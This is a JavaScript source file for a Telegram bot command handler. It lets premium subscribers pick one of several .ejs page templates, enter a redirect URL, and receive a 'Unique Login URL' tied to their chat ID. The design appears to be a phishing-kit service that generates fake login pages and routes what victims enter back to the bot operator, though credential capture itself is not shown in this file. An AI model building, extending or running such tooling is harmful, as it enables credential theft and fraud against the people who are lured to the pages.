const fs = require('fs');
const path = require('path');
require('dotenv').config(); // Load env variables
const { users } = require('../admin/src/connection/db');
const { checkPremiumMode } = require('../admin/handler/premium');

const hostURL = process.env.HOST_URL;

// Handle /create command
function handleCreateCommand(bot, msg) {
  const chatId = msg.chat.id;

  if (!users[chatId]) {
    bot.sendMessage(chatId, 'Please use the /start command first.');
    return;
  }

  if (!checkPremiumMode(chatId)) return;

  users[chatId].step = 'selecting_file';

  const viewsFolderPath = path.join(__dirname, '../views');
  fs.readdir(viewsFolderPath, (err, files) => {
    if (err) {
      bot.sendMessage(chatId, 'Error reading the folder.');
      return;
    }

    const fileNames = files
      .filter(file => path.extname(file) === '.ejs')
      .map(file => path.basename(file, '.ejs'));

    if (fileNames.length === 0) {
      bot.sendMessage(chatId, 'No files found in the /views folder.');
      return;
    }

    const keyboard = fileNames.map(fileName => [{
      text: fileName,
      callback_data: `select_${fileName}`
    }]);

    bot.sendMessage(chatId, 'Please select a file:', {
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  });
}

// Handle file selection
function handleFileSelection(bot, callbackQuery) {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (!checkPremiumMode(chatId)) return;

  if (data.startsWith('select_')) {
    const selectedFileName = data.replace('select_', '');

    if (!users[chatId]) users[chatId] = {};

    users[chatId].step = 'waiting_for_url';
    users[chatId].selectedFileName = selectedFileName;

    bot.sendMessage(chatId, `You selected: ${selectedFileName}\n🌐 Now enter your URL.`);
  }
}

// Handle URL input
function handleURLInput(bot, msg) {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (!checkPremiumMode(chatId)) return;

  if (users[chatId]?.step === 'waiting_for_url') {
    if (messageText.startsWith('https://')) {
      users[chatId].userRedirectUrl = `${messageText}?timestamp=${Date.now()}`;
    } else {
      users[chatId].userRedirectUrl = '';
    }

    const uniqueURL = `${hostURL}/${users[chatId].selectedFileName}/${chatId}`;
    bot.sendMessage(chatId, `🌐 Unique Login URL: <b>${uniqueURL}</b>`, { parse_mode: 'HTML' });

    users[chatId].step = null;
  }
}

// Register handlers
function register(bot) {
  bot.on('callback_query', (callbackQuery) => {
    handleFileSelection(bot, callbackQuery);
  });

  bot.on('message', (msg) => {
    if (msg.text && !msg.text.startsWith('/')) {
      handleURLInput(bot, msg);
    }
  });
}

module.exports = {
  handleCreateCommand,
  register
};
